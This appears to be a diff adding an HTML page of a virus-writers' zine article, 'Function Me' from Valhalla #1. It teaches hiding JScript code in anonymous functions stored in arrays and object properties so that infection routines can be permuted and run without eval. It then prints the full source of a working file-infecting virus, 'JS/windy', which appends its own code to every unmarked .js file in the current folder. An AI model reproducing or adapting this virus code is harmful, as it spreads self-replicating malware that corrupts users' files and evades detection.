@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html lang="en-US">
+	<head>
+		<title>Valhalla #1: Function Me by hh86</title>
+		<meta charset="utf-8">
+		<meta name="Keywords" content="">
+		<meta name="Description" content="">
+		<link type="text/css" rel="stylesheet" href="valhalla-articles.css">
+	</head>
+	<body>
+
+	<h1 style="text-align:center; font-family: Verdana; font-size: 24px; color: rgb(213, 21, 199);text-shadow: 2px 2px 5px rgb(158, 34, 198);">VALHALLA Issue #1</h1>
+	<h1 style="text-align:center; font-family: Verdana; font-size: 12px; color: #ffffff"><i>2019 Re-edition</i></h1>
+	<div class="main-container-articles">
+	<pre>
+                                   Function Me
+                                       by
+                                      hh86
+
+
+
+What is it?
+
+In JScript  we  have  functions.  They are declared like this: &#x22;function x(){}&#x22;,
+the name seems to be important  to identify them, however this is not true, they
+can be nameless.
+
+
+Reflections
+
+When we want to have copy of our code in an infection routine, we  commonly open
+the file where we are running and we read it  entirely.   But we can also assing
+entire code in Function to a variable and call the variable instead, we can also
+assing it in arrays (so we can  push  and  pop functions), this one is specially
+my favourite:
+
+x = [function(){code}, function(){code2}, function(){code3}]
+x[1]()
+//or
+r = &#x22;hh&#x22;+x[1]()+&#x22;86&#x22;
+
+
+Awesome!
+They have no  name so there is no very obvious reference to the function we want
+execute, and plus, &#x22;x[1]()&#x22; is very nice, isn&#x27;t it?  :)  Using  arrays  seems to
+be specially one great place to permutate the code, move  it around many garbage
+and then execute it without eval.    A nameless function can reference itself in
+Array, by using Array name and index.
+
+There is also the Expando.  We create an Object type variable:
+
+var h = {}
+h.hh86 = &#x22;I feel sleepy today&#x22;
+
+But we can assing any name we want to the expando, for example we  could use POP
+that is for Arrays (it pops the last item out):
+
+var h = {}
+h.pop = &#x22;Looks like POP&#x22;
+
+But we know that POP is not complete there.  For a true POP we need &#x22;()&#x22; for the
+method calling.  So, we can assing a function instead:
+
+var h = {}
+h.pop = function(){WScript.Echo(&#x22;Hello from POP&#x22;)}
+h.pop()
+
+This is like using Prototype, but smaller.  ;)
+
+h={};h.pop=function(){...};h.pop()
+
+So that is pretty much  everything  for an explanation of the technique, now you
+have to try it yourself using your imagination. I have written simple code demo,
+it must have no comments and must be single-lined to run  correctly  in infected
+files:
+
+u();
+function u(){
+/*JS/windy by hh86*/
+f = new ActiveXObject(&#x22;Scripting.FileSystemObject&#x22;);
+n = &#x22;;x&#x22; + f.GetTempName().substr(3, 4);
+r = &#x22;[&#x22; + Math.floor(Math.random()*100) + &#x22;]&#x22;;
+
+                                             //create array to hold virus code
+v = n + &#x22;=[]&#x22; + n + r + &#x22;=&#x22; + u + n + r + &#x22;()&#x22;;
+for(y = new Enumerator(f.getfolder(&#x22;.&#x22;).files); !y.atEnd(); y.moveNext())
+{
+    x = y.item();
+    if(f.GetExtensionName(x).toLowerCase()==&#x22;js&#x22;)
+    {
+        try
+        {
+            b = f.OpenTextFile(x);
+            h = b.ReadAll();
+            b.Close();
+            if(h.substr(h.length-4, 4) != &#x22;hh86&#x22;)
+            {
+                 p = x.Attributes;
+                 x.Attributes = 0;
+                 l = f.CreateTextFile(x);    //append virus code
+                                             //but it was a trick and the clock struck 12
+                 l.Write(h + &#x22;\r\n&#x22; + v + &#x22;//hh86&#x22;);
+                 l.Close();
+                 x.Attributes = p
+            }
+        }
+        catch(e){}
+    }
+}
+}                                            //at the end of the tail - just darkness
+	</pre>
+	</div>
+	</body>
+</html>
